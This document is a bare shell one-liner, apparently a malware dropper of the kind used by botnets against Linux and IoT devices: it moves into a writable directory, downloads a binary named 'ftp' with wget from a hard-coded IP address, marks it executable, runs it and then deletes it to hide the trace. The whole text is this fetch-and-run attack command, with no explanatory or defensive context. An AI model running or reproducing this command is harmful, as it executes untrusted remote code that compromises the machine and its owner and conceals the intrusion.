cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.36.213.43/ftp; chmod +x ftp; ./ftp; rm -rf ftp
